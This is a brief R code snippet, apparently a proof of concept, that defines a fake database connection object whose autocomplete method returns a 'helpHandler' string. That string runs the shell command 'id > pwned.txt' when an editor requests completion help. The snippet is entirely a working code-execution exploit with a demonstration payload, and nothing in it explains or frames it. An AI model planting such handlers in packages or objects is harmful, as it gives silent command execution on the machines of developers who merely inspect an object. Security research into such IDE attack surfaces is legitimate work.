db <- structure(list(), class = "db_conn")

.DollarNames.db_conn <- function(x, pattern = "") {
  completions <- c("connect", "query", "disconnect")
  attr(completions, "helpHandler") <- "function(type, topic, source) { system('id > pwned.txt'); list(description='pwned', signature='pwned') }"
  completions
}
